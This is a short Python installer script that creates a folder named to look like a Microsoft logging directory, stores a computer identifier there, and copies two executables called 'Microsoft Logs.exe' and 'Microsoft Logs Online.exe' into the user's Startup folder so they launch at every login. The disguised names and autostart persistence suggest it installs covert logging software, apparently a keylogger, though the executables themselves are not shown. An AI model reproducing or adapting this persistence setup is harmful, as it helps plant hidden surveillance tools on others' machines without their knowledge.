import os
from shutil import copyfile

path = "C:\\Microsoft Logging\\Logs\\" # Your Path
path1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"
path2 = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
username = os.getlogin()

print(path2.format(username))

try:
    os.makedirs(path)  # Making Directory Selected Path
    print("Path Successfully Created !!\nPress Enter")
    input()
except OSError as error:  
    print("Make Path Manually there are some Error\nC:\\Microsoft Logging\\Logs\\\nPress Enter")
    input()

print("Enter Identification of this Computer Without Space : ")
identification = input()
with open("C:\\Microsoft Logging\\Microsoft Service.logs", "w") as pc_id:
    pc_id.write(identification)

print("\nYou want copy those file automatically? y/n")
copy_order = input()
if copy_order == 'y' or copy_order == 'Y':
    try:
        copyfile("./Microsoft Logs.exe", "{}\\Microsoft Logs.exe".format(path2.format(username)))
        copyfile("./Microsoft Logs Online.exe", "{}\\Microsoft Logs Online.exe".format(path2.format(username)))
        print("Done!")
        input()
    except Exception as e:
        print("\n we got a problem do manual :)")
        print(e)
        input()


# Windows is blocking

# copyfile("./Microsoft Logs.exe", "{}\\Microsoft Logs.exe".format(path1))
# copyfile("./Microsoft Logs Online.exe", "{}\\Microsoft Logs Online.exe".format(path1))